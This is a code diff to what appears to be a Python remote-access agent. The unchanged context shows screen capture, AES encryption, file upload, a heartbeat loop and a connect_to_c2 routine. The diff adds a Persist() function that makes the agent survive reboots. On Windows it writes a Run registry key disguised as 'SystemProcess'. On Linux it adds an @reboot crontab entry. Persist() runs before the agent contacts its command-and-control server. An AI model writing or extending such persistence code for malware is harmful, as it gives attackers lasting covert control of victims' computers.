@@ -9,6 +9,7 @@ import subprocess
 import io
 import mss
 import cv2
+import sys
 from PIL import Image
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -134,6 +135,25 @@ def upload_file(data, name):
         return True
     except:
         return False
+        
+def Persist():
+    script_path = sys.executable
+
+    if platform.system().lower().startswith("win"):
+        try:
+            persist_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemProcess /t REG_SZ /d "{script_path}" /f'
+            subprocess.call(persist_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as error:
+            print(f"[!] Error setting persistence on Windows: {error}")
+
+    elif platform.system() in ["Linux", "Linux2"]:
+        try:
+            cron_job = f"@reboot {script_path}\n"
+            subprocess.call(f"crontab -l | {{ cat; echo \"{cron_job}\"; }} | crontab -", shell=True)
+        except PermissionError:
+            print("[!] Permission denied. Try running as root to set persistence.")
+        except Exception as error:
+            print(f"[!] Error setting persistence on Linux: {error}")
 
 def heartbeat_loop(sock, agent_id):
     while True:
@@ -265,4 +285,5 @@ def connect_to_c2():
             time.sleep(10)
 
 if __name__ == "__main__":
+    Persist()
     connect_to_c2()
